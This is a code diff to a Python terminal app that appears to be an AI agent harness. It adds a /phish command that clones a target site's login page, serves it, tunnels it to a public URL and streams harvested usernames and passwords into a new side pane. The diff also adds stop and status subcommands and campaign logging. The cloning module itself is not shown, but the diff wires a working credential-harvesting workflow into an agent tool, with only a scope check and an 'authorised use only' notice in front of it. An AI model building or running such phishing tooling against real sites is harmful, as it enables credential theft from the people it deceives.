@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import asyncio
+import threading
 import time
 from datetime import datetime
 from pathlib import Path
@@ -16,6 +17,7 @@ from textual.screen import ModalScreen
 from textual.widgets import Input, Static
 
 from .. import osint as osint_mod
+from .. import phish as phish_mod
 from .. import session as session_mod
 from .. import sources as sources_mod
 from .. import team as team_mod
@@ -28,7 +30,7 @@ from .boot import BootScreen
 from .complete import CompletionPopup, _iter_files
 from .palette_cmd import CommandPalette, PaletteEntry
 from .rails import LoopRail, TelemetryRail
-from .widgets import ChatPane, HeaderBar, StatusBar
+from .widgets import ChatPane, HeaderBar, StatusBar, ZimPane
 
 
 def _dedupe(items) -> list[str]:
@@ -135,7 +137,7 @@ class ZimZillaApp(App):
     }
     /* Below ~100 cols the rails are hidden by on_resize and the layout is
        today's two-pane shell. The transcript is never the thing that shrinks. */
-    Screen.narrow LoopRail, Screen.narrow TelemetryRail { display: none; }
+    Screen.narrow LoopRail, Screen.narrow TelemetryRail, Screen.narrow ZimPane { display: none; }
     #bottom-dock {
         dock: bottom;
         height: auto;
@@ -259,6 +261,11 @@ class ZimZillaApp(App):
         # without this the synthesis turn would overwrite the bar and drop the
         # workers' tokens and cost — the team's spend would vanish from view.
         self._team_tokens: tuple[int, int, float] = (0, 0, 0.0)
+        # `/phish` events arrive on the HTTP thread. The queue is the only
+        # crossing: the 0.25s rail tick drains it onto ZimPane on the UI
+        # thread. A lock is enough — these are tiny dicts, not renderables.
+        self._phish_events: list[dict] = []
+        self._phish_q_lock = threading.Lock()
 
     # ---- compose ----------------------------------------------------------
     def compose(self) -> ComposeResult:
@@ -271,6 +278,7 @@ class ZimZillaApp(App):
         with Horizontal(id="main"):
             yield LoopRail(self.palette)
             yield ChatPane(self.palette, rain=self.rain_on)
+            yield ZimPane(self.palette)
             yield TelemetryRail(self.palette, total_context=self.cfg.context_window)
         with Vertical(id="bottom-dock"):
             yield CompletionPopup(self.palette, id="complete")
@@ -484,6 +492,7 @@ class ZimZillaApp(App):
             self.query_one(ChatPane).card_tick()
         except Exception:
             pass
+        self._drain_phish()
 
     def _sync_rails(self) -> None:
         """Push the agent's session totals into the rails.
@@ -907,6 +916,7 @@ class ZimZillaApp(App):
             "compact": lambda a: self._cmd_compact(),
             "team": lambda a: self._cmd_team(a),
             "osint": lambda a: self._cmd_osint(a),
+            "phish": lambda a: self._cmd_phish(a),
             "zim-logfare": lambda a: self._cmd_zim_source("logfare"),
             "zim-tokenjuice": lambda a: self._cmd_zim_source("tokenjuice"),
             "zim-source": lambda a: self._cmd_zim_source(None),
@@ -938,6 +948,7 @@ class ZimZillaApp(App):
             ("/compact", "summarise history to free context"),
             ("/team <task>", "fan the task out across parallel agents"),
             ("/osint [kind] <target>", "open-source recon — email, phone, socials"),
+            ("/phish <host>", "clone a login page, serve it, harvest creds"),
             ("/exit", "leave the harness        (Ctrl+D also works)"),
         ]
         t = Text()
@@ -1288,6 +1299,10 @@ class ZimZillaApp(App):
             self.query_one(TelemetryRail).apply_palette(p)
         except Exception:
             pass
+        try:
+            self.query_one(ZimPane).apply_palette(p)
+        except Exception:
+            pass
 
         h = self.query_one(HeaderBar)
         h.palette = p
@@ -1633,6 +1648,197 @@ class ZimZillaApp(App):
                  style=p.primary)
         self.query_one(ChatPane).write_block(t)
 
+    # ---- /phish -----------------------------------------------------------
+    def _cmd_phish(self, args) -> None:
+        """/phish <host> — clone, serve, tunnel, harvest.
+
+        Subcommands: ``stop`` tears the campaign down, ``status`` reprints
+        the live URLs. A second ``/phish <host>`` replaces the running one.
+        """
+        if not args:
+            self._phish_usage()
+            return
+        verb = args[0].lower()
+        if verb in {"stop", "off", "kill"}:
+            self._phish_stop()
+            return
+        if verb in {"status", "info"}:
+            self._phish_status()
+            return
+
+        target = " ".join(args).strip()
+        ok, err = phish_mod.validate_target(target)
+        if not ok:
+            self._sys_line(f"usage: /phish <host>  ({err})", warn=True)
+            return
+
+        host = phish_mod.normalise_target(target)
+        allowed, reason = self.agent.scope.allows(host)
+        if not allowed:
+            self._sys_line(f"⛔ BLOCKED — {host} — {reason}", warn=True)
+            return
+
+        if self.busy:
+            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
+            return
+
+        pane = self._zim_pane()
+        if pane is not None:
+            pane.show_campaign(host)
+
+        p = self.palette
+        t = Text()
+        t.append("  ◈ PHISH     ", style=f"bold {p.accent}")
+        t.append(f"{host}\n", style=p.primary)
+        t.append("  ◈ NOTICE    ", style=f"bold {p.amber}")
+        t.append(
+            "authorised use only — your own property, a consented audit, "
+            "or a declared engagement\n",
+            style=p.dim,
+        )
+        self.query_one(ChatPane).write_block(t)
+        self._launch_phish(target)
+
+    def _phish_usage(self) -> None:
+        p = self.palette
+        t = Text()
+        t.append("  PHISH\n\n", style=f"bold {p.accent}")
+        t.append("  /phish <host>     ", style=f"bold {p.primary}")
+        t.append("clone the login page, serve it, tunnel it\n", style=p.dim)
+        t.append("  /phish status     ", style=f"bold {p.primary}")
+        t.append("show the live URLs and capture counts\n", style=p.dim)
+        t.append("  /phish stop       ", style=f"bold {p.primary}")
+        t.append("tear the campaign down\n", style=p.dim)
+        t.append("\n  hits and credentials stream into ", style=p.dim)
+        t.append("zim-pane", style=p.primary)
+        t.append(" on the right.\n", style=p.dim)
+        t.append("  campaigns land in ", style=p.dim)
+        t.append(f"{Path(self.cfg.state_dir) / 'phish'}/<host>-<stamp>/\n",
+                 style=p.primary)
+        self.query_one(ChatPane).write_block(t)
+
+    def _phish_status(self) -> None:
+        camp = phish_mod.active()
+        if camp is None or not camp.alive:
+            self._sys_line("no phishing campaign is running", warn=True)
+            return
+        p = self.palette
+        t = Text()
+        t.append("  ◈ PHISH     ", style=f"bold {p.accent}")
+        t.append(f"{camp.host}  ({'LIVE' if camp.alive else 'stopped'})\n",
+                 style=p.primary)
+        t.append("  ◈ LOCAL     ", style=f"bold {p.accent}")
+        t.append(camp.local_url + "\n", style=p.primary)
+        t.append("  ◈ PUBLIC    ", style=f"bold {p.accent}")
+        t.append((camp.public_url or "none — LAN only") + "\n",
+                 style=p.primary if camp.public_url else p.amber)
+        t.append("  ◈ CLONE     ", style=f"bold {p.accent}")
+        t.append(camp.clone_note + "\n", style=p.dim)
+        t.append("  ◈ CAPTURED  ", style=f"bold {p.accent}")
+        t.append(f"{len(camp.creds)} cred  ·  {len(camp.hits)} hit\n",
+                 style=p.primary)
+        self.query_one(ChatPane).write_block(t)
+
+    def _phish_stop(self) -> None:
+        camp = phish_mod.stop()
+        pane = self._zim_pane()
+        if pane is not None:
+            pane.note({"kind": "stopped"})
+        if camp is None:
+            self._sys_line("no phishing campaign is running", warn=True)
+            return
+        self._sys_line(
+            f"phish stopped — {camp.host}  ·  {len(camp.creds)} cred  ·  "
+            f"{len(camp.hits)} hit  ·  {camp.directory}",
+            ok=True,
+        )
+
+    @work(exclusive=True)
+    async def _launch_phish(self, target: str) -> None:
+        """Build the campaign off the UI thread: fetch + bind + tunnel."""
+        self.busy = True
+        bar = self.query_one(StatusBar)
+        bar.set_activity("phish: cloning", busy=True)
+        try:
+            camp = await asyncio.to_thread(
+                phish_mod.start,
+                self.cfg,
+                target,
+                self._on_phish_event,
+                tunnel=True,
+            )
+        except Exception as e:  # noqa: BLE001
+            self.busy = False
+            bar.set_activity("idle", busy=False)
+            bar.render_bar()
+            self._sys_line(f"phish failed: {type(e).__name__}: {e}", warn=True)
+            pane = self._zim_pane()
+            if pane is not None:
+                pane.hide()
+            self.query_one("#input", Input).focus()
+            return
+
+        self.busy = False
+        bar.set_activity("idle", busy=False)
+        bar.render_bar()
+
+        p = self.palette
+        t = Text()
+        t.append("  ◈ LOCAL     ", style=f"bold {p.accent}")
+        t.append(camp.local_url + "\n", style=p.primary)
+        t.append("  ◈ PUBLIC    ", style=f"bold {p.accent}")
+        if camp.public_url:
+            t.append(camp.public_url, style=f"bold {p.accent}")
+            if camp.tunnel.tool:
+                t.append(f"  via {camp.tunnel.tool}", style=p.dim)
+            t.append("\n")
+        else:
+            t.append("none — LAN only", style=p.amber)
+            if camp.tunnel.error:
+                t.append(f"  ({camp.tunnel.error})", style=p.dim)
+            t.append("\n")
+        t.append("  ◈ CLONE     ", style=f"bold {p.accent}")
+        t.append(camp.clone_note + "\n", style=p.dim)
+        t.append("  ◈ LOGS      ", style=f"bold {p.accent}")
+        t.append(str(camp.directory) + "\n", style=p.dim)
+        t.append("  · watch zim-pane for hits and credentials\n", style=p.dim)
+        self.query_one(ChatPane).write_block(t)
+        self.query_one("#input", Input).focus()
+
+    def _on_phish_event(self, event: dict) -> None:
+        """Called from the HTTP thread. Queue only — never touch widgets."""
+        with self._phish_q_lock:
+            self._phish_events.append(event)
+
+    def _drain_phish(self) -> None:
+        with self._phish_q_lock:
+            batch = list(self._phish_events)
+            self._phish_events.clear()
+        if not batch:
+            return
+        pane = self._zim_pane()
+        if pane is None:
+            return
+        for ev in batch:
+            pane.note(ev)
+            if ev.get("kind") == "cred":
+                user = ev.get("user") or "?"
+                self._sys_line(f"phish cred  {user}  ·  {self._mask(ev.get('password') or '')}")
+
+    @staticmethod
+    def _mask(secret: str) -> str:
+        if not secret:
+            return "(empty)"
+        if len(secret) <= 2:
+            return "•" * len(secret)
+        return secret[0] + "•" * (len(secret) - 2) + secret[-1]
+
+    def _zim_pane(self) -> ZimPane | None:
+        try:
+            return self.query_one(ZimPane)
+        except Exception:
+            return None
+
     def _team_agent_factory(self, cfg: Config, **kw) -> Agent:
         """Build a team Agent. The seam tests replace to stub the model.
 
@@ -1670,6 +1876,7 @@ class ZimZillaApp(App):
             ("/compact", "summarise history to free context", "compact"),
             ("/team", "fan the task out across parallel agents", "team"),
             ("/osint", "open-source recon on a target", "osint"),
+            ("/phish", "clone a login page and harvest creds", "phish"),
             ("/clear", "wipe transcript and history", "clear"),
             ("/exit", "leave the harness", "exit"),
         ]
@@ -1758,4 +1965,8 @@ class ZimZillaApp(App):
         self._cmd_clear()
 
     def action_quit(self) -> None:
+        try:
+            phish_mod.stop()
+        except Exception:
+            pass
         self.exit()
